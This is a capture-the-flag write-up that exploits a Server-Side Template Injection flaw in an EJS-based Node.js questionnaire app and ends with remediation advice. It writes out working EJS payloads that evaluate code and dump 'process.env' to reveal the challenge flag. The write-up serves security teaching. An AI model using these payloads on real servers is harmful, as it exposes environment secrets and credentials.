# 2026 Vibe Predictor

## Challenge Information

- **Platform:** BugForge
- **Challenge:** 2026 Vibe Predictor
- **Challenge ID:** `predictor-001`
- **Difficulty:** Easy
- **Vulnerability:** Server-Side Template Injection (SSTI)
- **Technology:** Node.js, Express.js, EJS
- **Status:** Solved

## Objective

Identify and exploit the Server-Side Template Injection vulnerability in the 2026 Vibe Predictor application to retrieve the challenge flag.

## Tools Used

- Mozilla Firefox
- Burp Suite
- Browser Developer Tools
- BugForge challenge instance

## Walkthrough

### 1. Initial Reconnaissance

Opened the challenge homepage and inspected its HTML source.

The homepage contained a button linking to `/predict`. The JavaScript file at `/public/js/app.js` only contained frontend initialization messages and did not reveal the backend processing logic.

The application response included the header:

```http
X-Powered-By: Express
```

This indicated that the application was running on Express.js.

### 2. Identifying the API Endpoint

Navigated to `/predict` and inspected the application's HTTP traffic using Burp Suite.

The questionnaire submitted answers to the following endpoint:

```http
POST /api/answer
Content-Type: application/json
```

An example request was:

```json
{
  "questionId": "name",
  "answer": "{{7*7}}"
}
```

The server returned a JSON response containing the next question. Subsequent requests collected the user's color preference, cheese preference, and beverage choice.

After completing the questionnaire, the server returned:

```json
{
  "completed": true
}
```

The application then displayed the result page at `/result`.

### 3. Testing for SSTI

Initially, submitted the following expression as the name:

```text
{{7*7}}
```

The result page displayed the expression literally, indicating that this syntax was not evaluated.

Next, tested an EJS-style expression:

```ejs
<%= 7*7 %>
```

The result page displayed:

```text
Hello, 49! ✨
```

This confirmed that the user-controlled value was being evaluated as a server-side template expression.

### 4. Confirming Node.js Runtime Access

To investigate the template execution context, submitted:

```ejs
<%= typeof process %>
```

The application returned:

```text
Hello, object! ✨
```

This demonstrated that the EJS expression could access the Node.js `process` object.

### 5. Retrieving the Flag

To inspect the available environment variables, used:

```ejs
<%= JSON.stringify(process.env) %>
```

The rendered result exposed the environment variables, including `FLAG`.

The relevant entry was:

```text
FLAG=bug{138mJCVczUSFSTX4hQaoOtToiFoN5uGf}
```

For a more targeted result, the following payload retrieves only the flag value:

```ejs
<%= process.env.FLAG %>
```

### 6. Flag

```text
bug{138mJCVczUSFSTX4hQaoOtToiFoN5uGf}
```

## Root Cause

The application evaluated user-controlled input as EJS template code instead of treating it strictly as data.

Because the template execution context exposed the Node.js `process` object, an attacker could access environment variables and retrieve the flag.

## Impact

Depending on the template configuration and available runtime objects, SSTI can expose sensitive application data, environment variables, and internal configuration. In more permissive execution contexts, it may lead to further server-side compromise.

## Remediation

1. Never compile user-controlled input as template source.
2. Pass user input into trusted templates as data rather than evaluating it as code.
3. Apply context-appropriate output encoding.
4. Avoid exposing sensitive runtime objects to template contexts.
5. Store secrets securely and limit their availability to application components that require them.
6. Run the application with least privilege and restrict access to sensitive files and environment variables.
7. Add security tests to detect template injection in user-controlled fields.

## Conclusion

The challenge was solved by identifying the answer-submission API, tracing the questionnaire to the result page, confirming EJS-style template evaluation, and accessing the `FLAG` environment variable through the exposed Node.js runtime object.

**Key takeaway:** Server-Side Template Injection occurs when untrusted input is interpreted as template code. User input should always remain data, never executable template source.